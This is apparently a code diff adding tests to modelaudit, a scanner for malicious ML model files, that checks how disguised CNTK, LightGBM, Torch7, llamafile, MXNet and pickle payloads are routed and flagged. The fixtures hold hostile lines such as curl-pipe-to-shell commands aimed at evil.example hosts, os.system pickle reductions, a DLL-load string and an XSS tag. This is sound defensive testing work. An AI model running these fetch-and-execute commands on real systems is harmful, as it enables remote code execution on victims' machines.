@@ -4,10 +4,12 @@ from __future__ import annotations
 
 import base64
 import gzip
+import importlib
 import json
 import pickle
 import zipfile
 from collections.abc import Iterator
+from contextlib import contextmanager
 from pathlib import Path
 from typing import Any
 
@@ -17,12 +19,110 @@ from modelaudit import core as core_module
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.cache.optimized_config import normalize_material_scan_config
 from modelaudit.core import scan_file, scan_model_directory_or_file
-from modelaudit.scanners import flax_msgpack_scanner, jinja2_template_scanner
+from modelaudit.scanners import flax_msgpack_scanner, jinja2_template_scanner, mxnet_scanner
 from modelaudit.scanners.base import CheckStatus, IssueSeverity, ScanResult
+from modelaudit.utils.file import detection as file_detection
+from modelaudit.utils.file.detection import LLAMAFILE_ROUTE_SCAN_BYTES, LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
 from modelaudit.utils.helpers.secure_hasher import compute_aggregate_hash
-from tests.helpers import create_mock_gguf, create_mock_onnx, create_mock_pytorch_zip
+from tests.helpers import create_mock_gguf, create_mock_mxnet_symbol, create_mock_onnx, create_mock_pytorch_zip
 
 _SYSTEM_GLOBAL_NAMES = ("os.system", "posix.system", "nt.system")
+
+
+def test_multi_file_directory_scan_shares_one_pickle_source_snapshot(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    module_dir = tmp_path / "modules"
+    module_dir.mkdir()
+    module_name = "modelaudit_tp_directory_call_graph_target"
+    (module_dir / f"{module_name}.py").write_text(
+        "import os\n\ndef invoke(command):\n    return os.system(command)\n",
+        encoding="utf-8",
+    )
+    monkeypatch.syspath_prepend(str(module_dir))
+    importlib.invalidate_caches()
+    dangerous_module = importlib.import_module(module_name)
+    dangerous_invoke = dangerous_module.invoke
+    model_dir = tmp_path / "models"
+    model_dir.mkdir()
+
+    class Payload:
+        def __reduce__(self) -> tuple[Any, tuple[str]]:
+            return (dangerous_invoke, ("echo cached-directory-scan",))
+
+    for index in range(2):
+        (model_dir / f"model-{index}.pkl").write_bytes(pickle.dumps(Payload()))
+    scopes_entered = 0
+    scopes_exited = 0
+    real_snapshot = core_module.shared_source_sensitive_caches
+
+    @contextmanager
+    def fake_snapshot() -> Iterator[None]:
+        nonlocal scopes_entered, scopes_exited
+        scopes_entered += 1
+        with real_snapshot():
+            try:
+                yield
+            finally:
+                scopes_exited += 1
+
+    monkeypatch.setattr(core_module, "shared_source_sensitive_caches", fake_snapshot)
+
+    result = core_module.scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
+
+    assert result.success is True
+    assert result.files_scanned == 2
+    assert (scopes_entered, scopes_exited) == (1, 1)
+    assert any(issue.rule_code == "DANGEROUS_CALL_GRAPH" for issue in result.issues)
+
+
+def test_multi_file_directory_scan_refreshes_changed_pickle_source_snapshot(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    module_dir = tmp_path / "modules"
+    module_dir.mkdir()
+    module_name = "modelaudit_tp_directory_changed_call_graph_target"
+    module_path = module_dir / f"{module_name}.py"
+    module_path.write_text("def invoke(command):\n    return command\n", encoding="utf-8")
+    monkeypatch.syspath_prepend(str(module_dir))
+    importlib.invalidate_caches()
+    safe_module = importlib.import_module(module_name)
+    safe_invoke = safe_module.invoke
+    model_dir = tmp_path / "models"
+    model_dir.mkdir()
+
+    class Payload:
+        def __reduce__(self) -> tuple[Any, tuple[str]]:
+            return (safe_invoke, ("echo changed-directory-scan",))
+
+    for index in range(2):
+        (model_dir / f"model-{index}.pkl").write_bytes(pickle.dumps(Payload()))
+
+    source_rewritten = False
+
+    def rewrite_before_second_scan(message: str, _percentage: float) -> None:
+        nonlocal source_rewritten
+        if "Scanning file 2/2" not in message or source_rewritten:
+            return
+        module_path.write_text(
+            "import os\n\ndef invoke(command):\n    return os.system(command)\n",
+            encoding="utf-8",
+        )
+        importlib.invalidate_caches()
+        source_rewritten = True
+
+    result = core_module.scan_model_directory_or_file(
+        str(model_dir),
+        cache_scan_results=False,
+        progress_callback=rewrite_before_second_scan,
+    )
+
+    assert source_rewritten is True
+    assert result.success is True
+    assert result.files_scanned == 2
+    assert any(issue.rule_code == "DANGEROUS_CALL_GRAPH" for issue in result.issues)
 
 
 def _build_malicious_pickle() -> bytes:
@@ -39,11 +139,43 @@ def _build_malicious_pickle() -> bytes:
     return pickle.dumps(DangerousPayload())
 
 
+def _build_malicious_skops_schema() -> bytes:
+    """Build a Skops schema that exercises CVE-2025-54412 detection."""
+    return json.dumps(
+        {
+            "__loader__": "OperatorFuncNode",
+            "__module__": "builtins",
+            "__class__": "eval",
+            "_skops_version": "0.11.0",
+            "content": {},
+        }
+    ).encode("utf-8")
+
+
 def _create_misnamed_zip(path: Path, entries: dict[str, bytes]) -> None:
     """Write a ZIP archive at an intentionally misleading file path."""
     with zipfile.ZipFile(path, "w") as archive:
         for name, data in entries.items():
             archive.writestr(name, data)
+
+
+def _write_malicious_cntk(path: Path, include_structure: bool = True) -> None:
+    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
+    structure = b" CompositeFunction primitive_functions " if include_structure else b""
+    payload = b" native_user_function loadlibrary C:\\temp\\evil.dll powershell -c curl http://evil.example/p.sh "
+    path.write_bytes(prefix + structure + payload)
+
+
+def _write_malicious_lightgbm(path: Path, valid: bool = True) -> None:
+    body = "tree=0\nversion=v4\nnum_class=1\n"
+    if valid:
+        body += (
+            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\nnum_leaves=2\n"
+            "split_feature=0\nleaf_value=0.1 0.2\n"
+            "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')\n"
+            "callback_url=https://collector.evil.example/payload.sh\n"
+        )
+    path.write_text(body, encoding="utf-8")
 
 
 def _create_zip_with_ordered_entries(path: Path, entries: list[tuple[str, bytes]]) -> None:
@@ -763,6 +895,53 @@ def test_scan_file_detects_malicious_zip_with_misleading_extension(tmp_path: Pat
     _assert_system_pickle_detected(result, "payload.pkl")
 
 
+def test_scan_file_routes_malicious_cntk_with_misleading_extension(tmp_path: Path) -> None:
+    disguised_cntk = tmp_path / "payload.jpg"
+    _write_malicious_cntk(disguised_cntk)
+
+    result = scan_file(str(disguised_cntk))
+
+    assert result.scanner_name == "cntk"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_file_routes_malicious_lightgbm_with_misleading_extension(tmp_path: Path) -> None:
+    disguised_lightgbm = tmp_path / "payload.jpg"
+    _write_malicious_lightgbm(disguised_lightgbm)
+
+    result = scan_file(str(disguised_lightgbm))
+
+    assert result.scanner_name == "lightgbm"
+    assert any(
+        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_file_routes_malicious_lightgbm_with_binary_prelude(tmp_path: Path) -> None:
+    disguised_lightgbm = tmp_path / "binary-payload.jpg"
+    _write_malicious_lightgbm(disguised_lightgbm)
+    disguised_lightgbm.write_bytes(b"\x01opaque tree prelude\x00" + disguised_lightgbm.read_bytes())
+
+    result = scan_file(str(disguised_lightgbm))
+
+    assert result.scanner_name == "lightgbm"
+    assert any(
+        check.name == "Command/Network Correlation Check" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_file_does_not_route_cntk_or_lightgbm_near_matches(tmp_path: Path) -> None:
+    cntk_near_match = tmp_path / "cntk-near-match.jpg"
+    lightgbm_near_match = tmp_path / "lightgbm-near-match.jpg"
+    _write_malicious_cntk(cntk_near_match, include_structure=False)
+    _write_malicious_lightgbm(lightgbm_near_match, valid=False)
+
+    assert scan_file(str(cntk_near_match)).scanner_name == "unknown"
+    assert scan_file(str(lightgbm_near_match)).scanner_name == "unknown"
+
+
 @pytest.mark.parametrize("suffix", [".flax", ".orbax", ".jax"])
 def test_scan_file_fails_closed_for_msgpack_extensions_when_dependency_is_missing(
     tmp_path: Path,
@@ -893,6 +1072,131 @@ def test_scan_directory_preserves_parseable_prefixed_zip_with_central_directory_
         issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
         for issue in result.issues
     )
+
+
+@pytest.mark.parametrize("stub", [b"\x7fELF" + b"\x00" * 60, b"MZ" + b"\x00" * 62])
+def test_scan_file_preserves_zip_findings_in_llamafile_polyglot(tmp_path: Path, stub: bytes) -> None:
+    polyglot = tmp_path / "payload.jpg"
+    _create_misnamed_zip(polyglot, {"payload.pkl": _build_malicious_pickle()})
+    _prepend_stub(polyglot, stub + b"llamafile runtime\n")
+
+    result = scan_file(str(polyglot), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "llamafile"
+    _assert_system_pickle_detected(result, "payload.pkl")
+
+
+@pytest.mark.parametrize("container_kind", ["pytorch", "executorch", "skops"])
+def test_scan_file_preserves_subtype_zip_findings_in_llamafile_polyglot(
+    tmp_path: Path,
+    container_kind: str,
+) -> None:
+    polyglot = tmp_path / f"{container_kind}.jpg"
+    pickle_member = "payload.pkl"
+    entries: dict[str, bytes]
+    if container_kind == "pytorch":
+        pickle_member = "data.pkl"
+        entries = {pickle_member: _build_malicious_pickle(), "version": b"1.6"}
+    elif container_kind == "executorch":
+        pickle_member = "bytecode.pkl"
+        entries = {pickle_member: _build_malicious_pickle(), "version": b"1"}
+    else:
+        entries = {
+            "schema.json": json.dumps(
+                {
+                    "__class__": "Pipeline",
+                    "__module__": "sklearn.pipeline",
+                    "__loader__": "ObjectNode",
+                    "_skops_version": "0.11.0",
+                    "content": {},
+                }
+            ).encode("utf-8"),
+            pickle_member: _build_malicious_pickle(),
+        }
+    _create_misnamed_zip(polyglot, entries)
+    _prepend_stub(polyglot, b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n")
+
+    result = scan_file(str(polyglot), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "llamafile"
+    _assert_system_pickle_detected(result, pickle_member)
+    if container_kind == "skops":
+        assert len([issue for issue in result.issues if issue.rule_code == "S201"]) == 1
+
+
+def test_scan_file_preserves_skops_cve_findings_in_llamafile_polyglot(tmp_path: Path) -> None:
+    polyglot = tmp_path / "skops-cve.jpg"
+    _create_misnamed_zip(polyglot, {"schema.json": _build_malicious_skops_schema()})
+    _prepend_stub(polyglot, b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n")
+
+    result = scan_file(str(polyglot), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "llamafile"
+    assert any(
+        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_scan_file_preserves_skops_cve_findings_in_out_of_window_executable_zip(tmp_path: Path) -> None:
+    polyglot = tmp_path / "skops-late-marker.jpg"
+    _create_misnamed_zip(polyglot, {"schema.json": _build_malicious_skops_schema()})
+    _prepend_stub(
+        polyglot,
+        b"\x7fELF"
+        + b"\x00" * 60
+        + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
+        + b"llamafile runtime"
+        + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
+    )
+
+    result = scan_file(str(polyglot), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "zip"
+    assert any(
+        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_scan_file_benign_llamafile_zip_polyglot_has_no_high_severity(tmp_path: Path) -> None:
+    polyglot = tmp_path / "safe.jpg"
+    _create_misnamed_zip(polyglot, {"payload.pkl": pickle.dumps({"safe": True})})
+    _prepend_stub(polyglot, b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n")
+
+    result = scan_file(str(polyglot), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "llamafile"
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+def test_scan_file_fails_closed_when_disguised_llamafile_route_probe_cannot_read(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    payload = tmp_path / "payload.jpg"
+    payload.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    def raise_os_error(_path: Path, _marker: bytes, _limit: int) -> bool:
+        raise OSError("synthetic marker probe failure")
+
+    monkeypatch.setattr("modelaudit.utils.file.detection._contains_casefolded_marker_in_prefix", raise_os_error)
+
+    result = scan_file(str(payload), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "unknown"
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert result.metadata["operational_error_reason"] == "llamafile_routing_incomplete"
+    check = next(check for check in result.checks if check.name == "Llamafile Routing")
+    assert "bounded marker bytes could not be read" in check.message
+
+    aggregate = scan_model_directory_or_file(str(payload), cache_scan_results=False)
+    assert aggregate.success is False
+    assert core_module.determine_exit_code(aggregate) == 2
 
 
 def test_scan_model_omits_phase_timings_by_default(tmp_path: Path) -> None:
@@ -1639,6 +1943,54 @@ def test_scan_file_routes_misnamed_gguf_by_header(tmp_path: Path) -> None:
     assert result.metadata["format"] == "gguf"
 
 
+def test_scan_file_routes_misnamed_mxnet_symbol_and_detects_custom_library(tmp_path: Path) -> None:
+    disguised_symbol = create_mock_mxnet_symbol(
+        tmp_path / "model.jpg",
+        custom_library="../../tmp/libevil.so",
+    )
+
+    result = scan_file(str(disguised_symbol))
+
+    assert result.scanner_name == "mxnet"
+    assert any(
+        issue.message == "Suspicious library reference in MXNet graph attributes"
+        and issue.details.get("attribute") == "library"
+        for issue in result.issues
+    )
+
+
+def test_scan_file_fails_closed_for_renamed_oversized_mxnet_symbol_prefix(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    monkeypatch.setattr(mxnet_scanner, "MAX_SYMBOL_READ_BYTES", 128)
+    disguised_symbol = tmp_path / "large.jpg"
+    disguised_symbol.write_text(
+        '{"nodes":[{"op":"Custom","name":"custom_loader"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"'
+        + ("x" * 256)
+        + '"}',
+        encoding="utf-8",
+    )
+
+    result = scan_file(str(disguised_symbol))
+
+    assert result.scanner_name == "mxnet"
+    assert result.success is False
+    assert "mxnet_symbol_truncated" in result.metadata["scan_outcome_reasons"]
+
+
+def test_scan_file_routes_misnamed_ggml_by_header(tmp_path: Path) -> None:
+    disguised_ggml = tmp_path / "model.payload"
+    disguised_ggml.write_bytes(b"GGML" + (1).to_bytes(4, "little") + b"\x00" * 24)
+
+    result = scan_file(str(disguised_ggml))
+
+    assert result.scanner_name == "gguf"
+    assert result.metadata["format"] == "ggml"
+    assert result.metadata["version"] == 1
+
+
 def test_scan_file_routes_gguf_chat_templates_through_jinja_analysis(tmp_path: Path) -> None:
     gguf_path = create_mock_gguf(
         tmp_path / "model.gguf",
@@ -1662,6 +2014,94 @@ def test_scan_file_does_not_route_gguf_magic_near_match_to_gguf(tmp_path: Path) 
 
     assert result.scanner_name == "unknown"
     assert result.issues == []
+
+
+def test_scan_file_keeps_torch_marker_safetensors_on_safetensors_scanner(tmp_path: Path) -> None:
+    file_path = tmp_path / "torch-marker-metadata.safetensors"
+    header = {
+        "__metadata__": {
+            "framework": "torch",
+            "kind": "tensor nn.Sequential",
+            "description": "<script>alert('xss')</script>",
+        },
+        "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
+    }
+    header_bytes = json.dumps(header, separators=(",", ":")).encode()
+    file_path.write_bytes(len(header_bytes).to_bytes(8, "little") + header_bytes + b"\x00" * 4)
+
+    result = scan_file(str(file_path))
+
+    assert result.scanner_name == "safetensors"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_file_detects_malicious_torch7_with_misleading_suffix(tmp_path: Path) -> None:
+    disguised_torch7 = tmp_path / "payload.jpg"
+    disguised_torch7.write_bytes(
+        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+
+    result = scan_file(str(disguised_torch7))
+
+    assert result.scanner_name == "torch7"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+@pytest.mark.parametrize("embedded_format", ["cntk", "lightgbm"])
+def test_scan_file_prioritizes_malicious_torch7_over_embedded_content_signatures(
+    tmp_path: Path,
+    embedded_format: str,
+) -> None:
+    disguised_torch7 = tmp_path / f"payload-{embedded_format}.jpg"
+    payload = (
+        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+    if embedded_format == "cntk":
+        embedded_payload = tmp_path / "embedded.cmf"
+        _write_malicious_cntk(embedded_payload)
+        payload += embedded_payload.read_bytes()
+    else:
+        embedded_payload = tmp_path / "embedded.lgb"
+        _write_malicious_lightgbm(embedded_payload)
+        payload += b"\x00" + embedded_payload.read_bytes()
+    disguised_torch7.write_bytes(payload)
+
+    result = scan_file(str(disguised_torch7))
+
+    assert result.scanner_name == "torch7"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+@pytest.mark.parametrize("filename", ["payload.onnx", "payload.pt", "payload.gz", "payload.tar.gz"])
+def test_scan_file_detects_malicious_torch7_with_recognized_misleading_suffix(
+    tmp_path: Path,
+    filename: str,
+) -> None:
+    disguised_torch7 = tmp_path / filename
+    disguised_torch7.write_bytes(
+        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+
+    result = scan_file(str(disguised_torch7))
+
+    assert result.scanner_name == "torch7"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_file_does_not_route_torch_source_near_match_with_misleading_suffix(tmp_path: Path) -> None:
+    source_near_match = tmp_path / "source.jpg"
+    source_near_match.write_text("import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n")
+
+    result = scan_file(str(source_near_match))
+
+    assert result.scanner_name == "unknown"
+    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
 
 
 def test_scan_file_routes_extensionless_llamafile(tmp_path: Path) -> None:
@@ -1721,8 +2161,59 @@ def test_scan_file_detects_malicious_extensionless_llamafile(tmp_path: Path) -> 
     assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
 
 
+def test_scan_file_detects_malicious_llamafile_with_misleading_suffix(tmp_path: Path) -> None:
+    disguised_llamafile = tmp_path / "payload.jpg"
+    disguised_llamafile.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    result = scan_file(str(disguised_llamafile))
+
+    assert result.scanner_name == "llamafile"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_file_detects_malicious_llamafile_with_onnx_suffix(tmp_path: Path) -> None:
+    disguised_llamafile = tmp_path / "payload.onnx"
+    disguised_llamafile.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    result = scan_file(str(disguised_llamafile))
+
+    assert result.scanner_name == "llamafile"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_file_benign_llamafile_with_onnx_suffix_reports_format_mismatch(tmp_path: Path) -> None:
+    disguised_llamafile = tmp_path / "safe.onnx"
+    disguised_llamafile.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n--threads 4")
+
+    result = scan_model_directory_or_file(str(disguised_llamafile), cache_scan_results=False)
+
+    assert "llamafile" in result.scanner_names
+    assert any(issue.message.startswith("File type validation failed") for issue in result.issues)
+    assert core_module.determine_exit_code(result) == 1
+
+
 def test_scan_file_does_not_route_extensionless_llamafile_near_match(tmp_path: Path) -> None:
     generic_executable = tmp_path / "tool"
+    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
+
+    result = scan_file(str(generic_executable))
+
+    assert result.scanner_name == "unknown"
+    assert result.issues == []
+
+
+def test_scan_file_does_not_route_misleading_suffix_llamafile_near_match(tmp_path: Path) -> None:
+    generic_executable = tmp_path / "tool.jpg"
     generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
 
     result = scan_file(str(generic_executable))
@@ -2023,6 +2514,23 @@ def test_scan_file_routes_readme_documentation_to_metadata_scanner(tmp_path: Pat
 
     assert result.scanner_name == "metadata"
     assert result.success is True
+
+
+@pytest.mark.parametrize("leading_line", ["tree model notes", "tree=implementation notes"])
+def test_scan_file_keeps_tree_prefixed_readme_on_metadata_scanner(tmp_path: Path, leading_line: str) -> None:
+    readme_path = tmp_path / "README.md"
+    readme_path.write_text(
+        f"{leading_line}\n"
+        "tree=0\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
+        "tree_sizes=12\nnum_leaves=2\nsplit_feature=0\nleaf_value=0.1 0.2\n"
+        f"API Key: sk-{'A' * 48}\n",
+        encoding="utf-8",
+    )
+
+    result = scan_file(str(readme_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "metadata"
+    assert any(issue.severity == IssueSeverity.INFO for issue in result.issues)
 
 
 def test_scan_file_routes_model_config_json_to_manifest_scanner(tmp_path: Path) -> None:
